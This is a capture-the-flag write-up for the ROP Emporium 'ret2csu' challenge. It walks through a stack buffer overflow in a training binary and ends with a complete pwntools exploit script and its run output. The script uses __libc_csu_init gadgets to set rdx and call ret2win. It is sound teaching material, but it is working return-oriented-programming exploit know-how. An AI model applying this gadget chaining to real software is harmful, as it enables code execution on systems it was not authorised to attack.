# ROPEmporium ret2csu

This writeup is based off of: https://www.rootnetsec.com/ropemporium-ret2csu/

Let's take a look at the binary:

```
$    file ret2csu
ret2csu: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=a799b370a24ba0109f1175f31b3058094b5feab5, not stripped
$    pwn checksec ret2csu
[*] '/Hackery/pod/modules/ret2_csu_dl/ropemporium_ret2csu/ret2csu'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$    ./ret2csu
ret2csu by ROP Emporium

Call ret2win()
The third argument (rdx) must be 0xdeadcafebabebeef

> 15935728
```

So we can see that we are dealing with a `64` bit binary with an NX stack. When we run it, we see that it prompts us for input.

## Reversing

When we take a look at the main function, we see this:

```
undefined8 main(void)

{
  setvbuf(stdout,(char *)0x0,2,0);
  puts("ret2csu by ROP Emporium\n");
  pwnme();
  return 0;
}
```

We can see that this function essentially prints out some text, and calls `pwnme`:

```
void pwnme(void)

{
  char input [32];
 
  memset(input,0,0x20);
  puts("Call ret2win()");
  puts("The third argument (rdx) must be 0xdeadcafebabebeef");
  puts("");
  printf("> ");
  PTR_puts_00601018 = (undefined *)0x0;
  PTR_printf_00601028 = (undefined *)0x0;
  PTR_memset_00601030 = (undefined *)0x0;
  fgets(input,0xb0,stdin);
  PTR_fgets_00601038 = (undefined *)0x0;
  return;
}
```

So we can see that it allows us to scan in `0xb0` (`176`) bytes worth of data into a `32` byte space. So we have a buffer overflow bug here. Also another thing to note here, it zeroes out the got addresses for `puts`, `printf`, and `memset`. We can see that it asks us to call the `ret2win` function with the third argument (since it is `x64` on linux, it is stored in the `rdx` register) being equal to `0xdeadcafebabebeef`. When we take a look at the `ret2win` function, we see that it calls `system`:

```

/* WARNING: Restarted to delay deadcode elimination for space: stack */

void ret2win(void)

{
  undefined8 uVar1;
  undefined2 uVar2;
  undefined8 uVar3;
  undefined2 uVar4;
  undefined8 local_28;
  undefined local_20;
  undefined7 uStack31;
  undefined local_18;
  undefined uStack23;
  undefined7 *local_10;
 
  local_28 = 0xaacca9d1d4d7dcc0;
  local_10 = &uStack31;
  uVar3 = 0xd5bed0dddfd28920;
  local_20 = (undefined)uVar1;
  uStack31 = (undefined7)((ulong)uVar1 >> 8);
  uVar4 = 0xaa;
  local_18 = (undefined)uVar2;
  uStack23 = (undefined)((ushort)uVar2 >> 8);
  system((char *)&local_28);
  uVar2 = uVar4;
  uVar1 = uVar3;
  return;
}
```

Looking at the assembly code for the function, we see that it manipulates the argument stored in `rdx` and uses it as an argument for `system`. So the statement it said about `The third argument (rdx) must be 0xdeadcafebabebeef` is probably true.

## Exploitation

So we will have to call `ret2win` with `rdx` being equal to `0xdeadcafebabebeef`. However when we look at the rop gadgets we have to change the value of the `rdx` register, we come up a little short:

```
$    python ROPgadget.py --binary ret2csu | grep rdx
0x0000000000400567 : lea ecx, [rdx] ; and byte ptr [rax], al ; test rax, rax ; je 0x40057b ; call rax
0x000000000040056d : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
```

Since the code base for this challenge is pretty small (like most ctf challenges), and that it is dynamically compiled means we don't have a lot of ROP gadgets to use. So we will be using the `ret_2_csu` (`ret_2_libc_csu_init`) technique.

#### Ret_2_csu

This is pretty simple when we get down to it. The `__libc_csu_init` function is responsible for initializing the libc file. Essentially we will be pulling ROP gadgets from this function.

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined __libc_csu_init()
             undefined         AL:1           <RETURN>
                             __libc_csu_init                                 XREF[5]:     Entry Point(*),
                                                                                          _start:00400606(*),
                                                                                          _start:00400606(*), 00400978,
                                                                                          00400a70(*)  
        00400840 41 57           PUSH       R15
        00400842 41 56           PUSH       R14
        00400844 49 89 d7        MOV        R15,RDX
        00400847 41 55           PUSH       R13
        00400849 41 54           PUSH       R12
        0040084b 4c 8d 25        LEA        R12,[__frame_dummy_init_array_entry]             = 4006D0h
                 be 05 20 00
        00400852 55              PUSH       RBP
        00400853 48 8d 2d        LEA        RBP,[__do_global_dtors_aux_fini_array_entry]     = 4006A0h
                 be 05 20 00
        0040085a 53              PUSH       RBX
        0040085b 41 89 fd        MOV        R13D,EDI
        0040085e 49 89 f6        MOV        R14,RSI
        00400861 4c 29 e5        SUB        RBP,R12
        00400864 48 83 ec 08     SUB        RSP,0x8
        00400868 48 c1 fd 03     SAR        RBP,0x3
        0040086c e8 ef fc        CALL       _init                                            int _init(EVP_PKEY_CTX * ctx)
                 ff ff
        00400871 48 85 ed        TEST       RBP,RBP
        00400874 74 20           JZ         LAB_00400896
        00400876 31 db           XOR        EBX,EBX
        00400878 0f 1f 84        NOP        dword ptr [RAX + RAX*0x1]
                 00 00 00
                 00 00
                             LAB_00400880                                    XREF[1]:     00400894(j)  
        00400880 4c 89 fa        MOV        RDX,R15
        00400883 4c 89 f6        MOV        RSI,R14
        00400886 44 89 ef        MOV        EDI,R13D
        00400889 41 ff 14 dc     CALL       qword ptr [R12 + RBX*0x8]=>->frame_dummy         undefined frame_dummy()
                                                                                             = 4006D0h
                                                                                             = 4006A0h
                                                                                             undefined __do_global_dtors_aux()
        0040088d 48 83 c3 01     ADD        RBX,0x1
        00400891 48 39 dd        CMP        RBP,RBX
        00400894 75 ea           JNZ        LAB_00400880
                             LAB_00400896                                    XREF[1]:     00400874(j)  
        00400896 48 83 c4 08     ADD        RSP,0x8
        0040089a 5b              POP        RBX
        0040089b 5d              POP        RBP
        0040089c 41 5c           POP        R12
        0040089e 41 5d           POP        R13
        004008a0 41 5e           POP        R14
        004008a2 41 5f           POP        R15
        004008a4 c3              RET
```

From this function, there are two rop gadgets that we will be pulling from.

This one will allow us to control various registers:

```
        0040089a 5b              POP        RBX
        0040089b 5d              POP        RBP
        0040089c 41 5c           POP        R12
        0040089e 41 5d           POP        R13
        004008a0 41 5e           POP        R14
        004008a2 41 5f           POP        R15
        004008a4 c3              RET
```

This one will allow us to control the `RDX`, `RSI`, and `EDI` registers:

```
        00400880 4c 89 fa        MOV        RDX,R15
        00400883 4c 89 f6        MOV        RSI,R14
        00400886 44 89 ef        MOV        EDI,R13D
        00400889 41 ff 14 dc     CALL       qword ptr [R12 + RBX*0x8]=>->frame_dummy         undefined frame_dummy()
                                                                                             = 4006D0h
                                                                                             = 4006A0h
                                                                                             undefined __do_global_dtors_aux()
        0040088d 48 83 c3 01     ADD        RBX,0x1
        00400891 48 39 dd        CMP        RBP,RBX
        00400894 75 ea           JNZ        LAB_00400880
```

However the thing is with this gadget, it doesn't end in a ret (at least not immediately after the `MOV` instructions we need) so we will have to trace through and make sure the rest of the code until it hits a `RET`, and make sure there isn't anything that causes an issue. With the first gadget, we can assign a value to `R15`, which with the second gadget we will copy it's value to the `RDX` register. Looking at the full code path for the second gadget, we see this:

```
                             LAB_00400880                                    XREF[1]:     00400894(j)  
        00400880 4c 89 fa        MOV        RDX,R15
        00400883 4c 89 f6        MOV        RSI,R14
        00400886 44 89 ef        MOV        EDI,R13D
        00400889 41 ff 14 dc     CALL       qword ptr [R12 + RBX*0x8]=>->frame_dummy         undefined frame_dummy()
                                                                                             = 4006D0h
                                                                                             = 4006A0h
                                                                                             undefined __do_global_dtors_aux()
        0040088d 48 83 c3 01     ADD        RBX,0x1
        00400891 48 39 dd        CMP        RBP,RBX
        00400894 75 ea           JNZ        LAB_00400880
                             LAB_00400896                                    XREF[1]:     00400874(j)  
        00400896 48 83 c4 08     ADD        RSP,0x8
        0040089a 5b              POP        RBX
        0040089b 5d              POP        RBP
        0040089c 41 5c           POP        R12
        0040089e 41 5d           POP        R13
        004008a0 41 5e           POP        R14
        004008a2 41 5f           POP        R15
        004008a4 c3              RET
```

So a few conditions we will need to meet. The first we have to ensure that `[R12 + RBX*0x8]` resolves to a pointer to a valid instruction pointer. After that, we need to ensure that `RBP` and `RBX` are equal to each other (after `RBX` is incremented by one) otherwise it will jump to `LAB_00400880` and rerun our gadget. After that the first gadget runs which ends in a `RET` instruction, however we need to ensure that there are values on the stack for the `POP` instructions.

For the function we are calling we will call `_init`. The reason why I call this function instead of other function, is this one doesn't crash when I call it in this context. Let's find a pointer to it's address.

When we check the address of `_init` in ghidra, we see that it is `0x400560`:

```
                             //
                             // .init
                             // SHT_PROGBITS  [0x400560 - 0x400576]
                             // ram: 00400560-00400576
                             //
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             int __stdcall _init(EVP_PKEY_CTX * ctx)
             int               EAX:4          <RETURN>
             EVP_PKEY_CTX *    RDI:8          ctx
                             __DT_INIT                                       XREF[4]:     Entry Point(*),
                             _init                                                        __libc_csu_init:0040086c(c),
                                                                                          00600e38(*),
                                                                                          _elfSectionHeaders::000002d0(*)  
        00400560 48 83 ec 08     SUB        RSP,0x8
```

We can find a pointer to it using gdb:

```
gef➤  search-pattern 0x400560
[+] Searching '\x60\x05\x40' in memory
[+] In '/Hackery/pod/modules/ret2_csu_dl/ropemporium_ret2csu/ret2csu'(0x400000-0x401000), permission=r-x
  0x400e38 - 0x400e44  →   "\x60\x05\x40[...]"
[+] In '/Hackery/pod/modules/ret2_csu_dl/ropemporium_ret2csu/ret2csu'(0x600000-0x601000), permission=r--
  0x600e38 - 0x600e44  →   "\x60\x05\x40[...]"
```

Or we can find it using the `DYAMIC` variable:

```
gef➤  x/4g &_DYNAMIC
0x600e20:    0x0000000000000001    0x0000000000000001
0x600e30:    0x000000000000000c    0x0000000000400560
```

So the value we will set `R12` will be `0x600e38`, which will end up calling `_init`. We will set `RBX` to zero, that way it doesn't interfere with the call. For the compare it will be incremented to `1`, so we will need to set `RBP` to `1` to pass it. After that we will just need filler values for the rest of the `POPS`. After that we can just call `ret2win`, and do to our previous work we will have `RBX` set to `0xdeadcafebabebeef`.

## Exploit

Putting it all together, we have the following exploit:

```
# This exploit is based off of: https://www.rootnetsec.com/ropemporium-ret2csu/

from pwn import *

# Establish the target process
target = process('./ret2csu')
#gdb.attach(target, gdbscript = 'b *    0x4007b0')

# Our two __libc_csu_init rop gadgets
csuGadget0 = p64(0x40089a)
csuGadget1 = p64(0x400880)

# Address of ret2win and _init pointer
ret2win = p64(0x4007b1)
initPtr = p64(0x600e38)

# Padding from start of input to saved return address
payload = "0"*0x28

# Our first gadget, and the values to be popped from the stack

# Also a value of 0xf means it is a filler value
payload += csuGadget0
payload += p64(0x0) # RBX
payload += p64(0x1) # RBP
payload += initPtr # R12, will be called in `CALL qword ptr [R12 + RBX*0x8]`
payload += p64(0xf) # R13
payload += p64(0xf) # R14
payload += p64(0xdeadcafebabebeef) # R15 > soon to be RDX
    
# Our second gadget, and the corresponding stack values
payload += csuGadget1
payload += p64(0xf) # qword value for the ADD RSP, 0x8 adjustment
payload += p64(0xf) # RBX
payload += p64(0xf) # RBP
payload += p64(0xf) # R12
payload += p64(0xf) # R13
payload += p64(0xf) # R14
payload += p64(0xf) # R15

# Finally the address of ret2win
payload += ret2win

# Send the payload
target.sendline(payload)
target.interactive()
```

When we run it:

```
$    python exploit.py
[+] Starting local process './ret2csu': pid 17309
[*] Switching to interactive mode
ret2csu by ROP Emporium

Call ret2win()
The third argument (rdx) must be 0xdeadcafebabebeef

> ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$
[*] Process './ret2csu' stopped with exit code -11 (SIGSEGV) (pid 17309)
[*] Got EOF while sending in interactive
```

Just like that, we got the flag!







